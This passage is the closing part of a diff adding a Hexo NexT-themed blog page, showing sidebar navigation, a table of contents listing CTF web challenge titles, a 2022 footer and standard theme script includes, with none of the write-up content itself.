+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">24</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#finalrce"><span class="nav-number"></span> <span class="nav-text">finalrce</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSAWQual-2019-Unagi"><span class="nav-number"></span> <span class="nav-text">[CSAWQual 2019]Unagi</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hardrce-3"><span class="nav-number"></span> <span class="nav-text">hardrce_3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF-2021-Middle-magic"><span class="nav-number"></span> <span class="nav-text">[鹤城杯 2021]Middle magic</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NCTF-2019-SQLi"><span class="nav-number"></span> <span class="nav-text">[NCTF 2019]SQLi</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
